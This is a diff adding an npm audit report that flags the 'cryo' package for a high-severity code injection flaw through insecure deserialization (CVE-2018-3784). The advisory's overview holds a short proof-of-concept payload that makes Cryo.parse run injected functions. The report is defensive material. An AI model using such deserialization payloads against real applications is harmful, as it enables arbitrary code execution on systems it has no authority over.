@@ -1,0 +1,72 @@
+{
+  "actions": [
+    {
+      "action": "review",
+      "module": "cryo",
+      "resolves": [
+        {
+          "id": 1066151,
+          "path": ".>cryo",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1066151": {
+      "findings": [
+        {
+          "version": "0.0.6",
+          "paths": [
+            ".>cryo"
+          ]
+        }
+      ],
+      "metadata": null,
+      "vulnerable_versions": "<=0.0.6",
+      "module_name": "cryo",
+      "severity": "high",
+      "github_advisory_id": "GHSA-38f5-ghc2-fcmv",
+      "cves": [
+        "CVE-2018-3784"
+      ],
+      "access": "public",
+      "patched_versions": "<0.0.0",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "updated": "2020-08-31T18:32:59.000Z",
+      "recommendation": "None",
+      "cwe": [
+        "CWE-94"
+      ],
+      "found_by": null,
+      "deleted": null,
+      "id": 1066151,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2018-3784\n- https://hackerone.com/reports/350418\n- https://github.com/advisories/GHSA-38f5-ghc2-fcmv\n- https://www.npmjs.com/advisories/690",
+      "created": "2022-03-11T08:00:43.889Z",
+      "reported_by": null,
+      "title": "Code Injection in cryo",
+      "npm_advisory_id": null,
+      "overview": "All versions of `cryo` are vulnerable to code injection due to an Insecure implementation of deserialization.\n\n\n## Proof of concept\n\n```\nvar Cryo = require('cryo');\nvar frozen = '{\"root\":\"_CRYO_REF_3\",\"references\":[{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\"); return 1111;}\"},{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\");return 2222;}\"},{\"contents\":{\"toString\":\"_CRYO_REF_0\",\"valueOf\":\"_CRYO_REF_1\"},\"value\":\"_CRYO_OBJECT_\"},{\"contents\":{\"__proto__\":\"_CRYO_REF_2\"},\"value\":\"_CRYO_OBJECT_\"}]}'\nvar hydrated = Cryo.parse(frozen);\nconsole.log(hydrated);\n```\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative module until a fix is made available.",
+      "url": "https://github.com/advisories/GHSA-38f5-ghc2-fcmv"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 0,
+      "high": 1,
+      "critical": 0
+    },
+    "dependencies": 2,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 2
+  }
+}
